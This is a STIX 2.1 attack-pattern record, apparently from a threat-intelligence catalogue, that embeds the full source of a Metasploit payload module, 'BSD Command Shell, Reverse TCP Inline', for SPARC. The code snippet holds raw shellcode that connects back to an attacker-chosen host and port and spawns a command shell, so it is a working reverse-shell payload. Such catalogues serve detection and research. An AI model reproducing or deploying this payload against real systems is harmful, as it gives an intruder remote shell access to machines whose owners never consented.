{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7c44fe2d-316b-463a-a0aa-2122f0149502",
    "created": "2024-08-14T16:33:19.40453Z",
    "modified": "2024-08-14T16:33:19.404533Z",
    "name": "BSD Command Shell, Reverse TCP Inline",
    "description": "Connect back to attacker and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/bsd/sparc/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 128\n\n  include Msf::Payload::Single\n  include Msf::Payload::Bsd\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'BSD Command Shell, Reverse TCP Inline',\n      'Description'   => 'Connect back to attacker and spawn a command shell',\n      'Author'        => 'vlad902',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'bsd',\n      'Arch'          => ARCH_SPARC,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShell\n    ))\n  end\n\n  def generate(_opts = {})\n    port    = (datastore['RPORT'] || '0').to_i\n    host    = nil\n    begin\n      host    = Rex::Socket.resolv_nbo_i(datastore['RHOST'] || '127.0.0.1')\n    rescue SocketError\n      host    = Rex::Socket.resolv_nbo_i('127.0.0.1')\n    end\n\n    payload =\n      \"\\x9c\\x2b\\xa0\\x07\\x94\\x1a\\xc0\\x0b\\x92\\x10\\x20\\x01\\x90\\x10\\x20\\x02\" +\n      \"\\x82\\x10\\x20\\x61\\x91\\xd0\\x20\\x08\\xd0\\x23\\xbf\\xf8\\x92\\x10\\x20\\x03\" +\n      \"\\x92\\xa2\\x60\\x01\\x82\\x10\\x20\\x5a\\x91\\xd0\\x20\\x08\\x12\\xbf\\xff\\xfd\" +\n      \"\\xd0\\x03\\xbf\\xf8\" +\n      Rex::Arch::Sparc.set(0xff020000 | port, \"l0\") +\n      Rex::Arch::Sparc.set(host, \"l1\") +\n      \"\\xe0\\x3b\\xbf\\xf0\\x92\\x23\\xa0\\x10\\x94\\x10\\x20\\x10\\x82\\x10\\x20\\x62\" +\n      \"\\x91\\xd0\\x20\\x08\\x94\\x1a\\xc0\\x0b\\x21\\x0b\\xd8\\x9a\\xa0\\x14\\x21\\x6e\" +\n      \"\\x23\\x0b\\xdc\\xda\\x90\\x23\\xa0\\x10\\x92\\x23\\xa0\\x08\\xe0\\x3b\\xbf\\xf0\" +\n      \"\\xd0\\x23\\xbf\\xf8\\xc0\\x23\\xbf\\xfc\\x82\\x10\\x20\\x3b\\x91\\xd0\\x20\\x08\"\n  end\nend\n",
    "x_mitre_platforms": [
        "bsd'"
    ]
}